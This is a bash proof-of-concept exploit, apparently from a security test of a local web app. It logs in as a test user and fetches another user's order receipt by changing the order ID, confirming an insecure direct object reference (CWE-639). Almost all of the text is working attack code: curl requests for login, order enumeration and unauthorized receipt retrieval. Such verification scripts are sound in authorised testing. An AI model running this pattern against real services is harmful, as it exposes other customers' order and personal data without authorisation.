#!/bin/bash

# POC: Insecure Direct Object Reference (IDOR) in Order Receipt Endpoint
# This POC demonstrates that an authenticated user can access order receipts
# belonging to other users by manipulating the order_id parameter.

TARGET="http://localhost:8082"
USERNAME="test"
PASSWORD="test"

echo "=========================================="
echo "IDOR in Order Receipt Endpoint POC"
echo "=========================================="
echo ""

# Step 1: Authenticate as test user - following the evidence exactly
echo "[*] Step 1: Authenticating as user '$USERNAME'..."

# POST to root with username, follow redirects
curl -s -c cookies.txt -X POST "$TARGET/" -d "username=$USERNAME" -L > /dev/null

# POST to /password/test with password, follow redirects
LOGIN_RESPONSE=$(curl -s -b cookies.txt -c cookies.txt -X POST "$TARGET/password/test" -d "password=$PASSWORD" -L)

# Debug: Check what we got
if [ -z "$LOGIN_RESPONSE" ]; then
    echo "[-] Empty response from login"
    rm -f cookies.txt
    exit 1
fi

# Check if we have a valid session by trying to access orders
ORDERS_CHECK=$(curl -s -b cookies.txt "$TARGET/orders")

if echo "$ORDERS_CHECK" | grep -qi "order"; then
    echo "[+] Successfully authenticated as test user"
else
    echo "[-] Authentication may have failed"
    echo "Attempting to continue anyway..."
fi

echo ""

# Step 2: Retrieve legitimate orders
echo "[*] Step 2: Fetching legitimate orders for test user..."
ORDERS_RESPONSE=$(curl -s -b cookies.txt "$TARGET/orders")

# Extract order IDs - try multiple patterns
LEGITIMATE_ORDERS=$(echo "$ORDERS_RESPONSE" | grep -oE 'order/[0-9]+' | grep -oE '[0-9]+' | sort -u)

if [ -z "$LEGITIMATE_ORDERS" ]; then
    # Try alternative extraction
    LEGITIMATE_ORDERS=$(echo "$ORDERS_RESPONSE" | grep -oE '[0-9]{6}' | sort -u)
fi

if [ -z "$LEGITIMATE_ORDERS" ]; then
    echo "[-] Could not extract orders from response"
    echo "Raw orders response (first 300 chars):"
    echo "$ORDERS_RESPONSE" | head -c 300
    echo ""
    echo "Continuing with known legitimate orders from evidence..."
    LEGITIMATE_ORDERS="300123
300214
300327
300481"
fi

echo "[+] User's legitimate orders:"
echo "$LEGITIMATE_ORDERS" | while read order; do
    echo "    - Order ID: $order"
done

ORDERS_COUNT=$(echo "$LEGITIMATE_ORDERS" | wc -l)
echo "[+] Total legitimate orders: $ORDERS_COUNT"

echo ""

# Step 3: Attempt to access order 300401 (not in legitimate orders list)
UNAUTHORIZED_ORDER="300401"
echo "[*] Step 3: Checking if order $UNAUTHORIZED_ORDER belongs to test user..."

# Check if 300401 is in the legitimate orders list
if echo "$LEGITIMATE_ORDERS" | grep -q "^$UNAUTHORIZED_ORDER$"; then
    echo "[-] Order $UNAUTHORIZED_ORDER is in user's legitimate orders - cannot demonstrate IDOR"
    rm -f cookies.txt
    exit 1
fi

echo "[+] Confirmed: Order $UNAUTHORIZED_ORDER is NOT in user's legitimate orders list"
echo ""

# Attempt to access the unauthorized receipt
echo "[*] Step 4: Attempting to access receipt for unauthorized order $UNAUTHORIZED_ORDER..."
RECEIPT_RESPONSE=$(curl -s -b cookies.txt -w "\nHTTP_STATUS:%{http_code}" "$TARGET/order/$UNAUTHORIZED_ORDER/receipt")

HTTP_STATUS=$(echo "$RECEIPT_RESPONSE" | grep "HTTP_STATUS" | cut -d: -f2)
RECEIPT_BODY=$(echo "$RECEIPT_RESPONSE" | sed '/HTTP_STATUS/d')

echo "[+] HTTP Status Code: $HTTP_STATUS"

if [ "$HTTP_STATUS" = "200" ]; then
    # Verify this actually contains order data
    if echo "$RECEIPT_BODY" | grep -qi "order\|receipt\|300401"; then
        echo ""
        echo "=========================================="
        echo "[!] IDOR VULNERABILITY CONFIRMED!"
        echo "=========================================="
        echo "[!] User successfully accessed order $UNAUTHORIZED_ORDER that does NOT belong to them"
        echo ""
        echo "Receipt content preview:"
        echo "----------------------------------------"
        echo "$RECEIPT_BODY" | head -30
        echo "----------------------------------------"
        echo ""
        echo "[!] IMPACT: Authenticated users can access ANY order receipt by manipulating order_id"
        echo "[!] This is a horizontal privilege escalation vulnerability (CWE-639)"
        echo ""
        echo "Verification:"
        echo "- Test user's legitimate orders: $(echo "$LEGITIMATE_ORDERS" | tr '\n' ',' | sed 's/,$//' | sed 's/,/, /g')"
        echo "- Unauthorized order accessed: $UNAUTHORIZED_ORDER"
        echo "- HTTP Status: $HTTP_STATUS (should be 403 or 404, but got 200)"
        
        rm -f cookies.txt
        exit 0
    else
        echo "[-] Got HTTP 200 but response doesn't contain expected order data"
        echo "Response:"
        echo "$RECEIPT_BODY"
        rm -f cookies.txt
        exit 1
    fi
elif [ "$HTTP_STATUS" = "403" ] || [ "$HTTP_STATUS" = "401" ]; then
    echo "[-] Access properly denied (HTTP $HTTP_STATUS) - vulnerability does not exist"
    rm -f cookies.txt
    exit 1
else
    echo "[-] Unexpected response (HTTP $HTTP_STATUS)"
    echo "Response body (first 300 chars):"
    echo "$RECEIPT_BODY" | head -c 300
    rm -f cookies.txt
    exit 1
fi